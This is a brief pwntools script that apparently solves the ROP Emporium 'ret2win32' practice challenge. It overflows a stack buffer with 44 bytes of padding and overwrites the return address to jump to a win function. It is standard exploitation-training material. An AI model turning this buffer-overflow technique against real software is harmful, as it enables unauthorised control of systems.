from pwn import *

p = process('./ret2win32')

junk = "A" * 44

ret2win_addr = 0x08048659

payload = junk + p32(ret2win_addr)

p.recvuntil('using fgets!')
p.sendline(payload)
p.interactive()

